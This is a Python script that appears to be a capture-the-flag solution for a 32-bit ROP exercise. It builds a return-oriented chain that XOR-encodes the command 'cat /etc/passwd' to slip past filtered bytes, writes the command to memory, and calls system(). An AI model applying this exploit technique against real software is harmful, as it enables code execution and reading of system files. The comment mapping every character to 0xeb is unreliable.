import struct
import pdb

def stringpacker(addr):

    return str(struct.pack("<I",addr))


def encodeString(inputString, xorByte):
    inputStringBytes = bytearray(inputString)

    encodedString = ""

    for c in inputStringBytes:
        xorVal = c ^ xorByte
        encodedString += chr(xorVal)

    return encodedString

def padString(inputString, width):
	if len(inputString) % width == 0:
       		inputString += "\x00" * width
    	else:
        	inputString += (width-(len(inputString)%width)) * "\x00"
        return inputString

def getGoodCharacters():
    goodchars = ""
    for i in range(1,256): # we cannot use the \x00 byte, since it is the string delimiter and therefore a *natural* bad character
        char = chr(i)
        if char in badchars:
            continue
        else:
            goodchars += char
    return goodchars

def RopChainHelper(inputString, location):
    payload = ""

    paddedString = padString(inputString,4)
    xorChar = -1
    encodedString = paddedString

    if containsBadCharacters(encodedString) == True:

        goodChars = getGoodCharacters()
        goodCharsList = list(goodChars)

        while containsBadCharacters(encodedString) == True:
            if len(goodCharsList) == 0:
                exit() # we have no more good characters, giving up...

            xorChar = ord(goodCharsList.pop())
            encodedString = encodeString(paddedString,xorChar)

    # we have found a character encoding without bad characters.
    # Save the (encoded) string to memory

    for i in range(0,len(encodedString),4):
        payload += stringpacker(pop_esi_edi)
        payload += encodedString[i:i+4] # will be stored in esi
        payload += stringpacker(location+i) # will be stored in edi
        payload += stringpacker(mov_edi_esi)





    # Decode string, if necessary
    if xorChar != -1:
        for i in range(0,len(encodedString)):
            payload += stringpacker(pop_ebx_ecx)
            payload += stringpacker(location+i) # will be stored in ebx
            payload += chr(xorChar) * 4 # will be stored in ecx, we actually only need the lowest byte (cl)
            payload += stringpacker(xor_byte_ebx)




    return payload


def containsBadCharacters(inputString):
    for c in badchars:
        if c in inputString:
            return True

    return False

crap = "A" * 44
badchars = "bic/ fns"

goodchars = getGoodCharacters()

'''

conversions:
'b' -> 0xeb
'i' -> 0xeb
'c' -> 0xeb
'/' -> 0xeb
' ' -> 0xeb
'f' -> 0xeb
'n' -> 0xeb
's' -> 0xeb

'''

call_system = 0x080487b7 # usefulFunction +  14 -- call   0x80484e0 <system@plt>
xor_byte_ebx = 0x08048890 # usefulGadgets + 0 -- xor BYTE PTR [ebx],cl; ret
mov_edi_esi = 0x08048893 # usefulGadgets + 3 -- mov    DWORD PTR [edi],esi; ret
pop_ebx_ecx = 0x08048896 # usefulGadgets + 6 -- pop ebx; pop ecx; ret
pop_esi_edi = 0x08048899 # usefulGadgets + 9 -- pop esi; pop edi; ret

data_section = 0x0804a038


command = "cat /etc/passwd"
payload = crap

payload += RopChainHelper(command,data_section)

payload += stringpacker(call_system)

payload += stringpacker(data_section)

if len(payload) > 512:
    exit("Payload size is limited to 512 bytes, choose a shorter command string!")

print(payload)



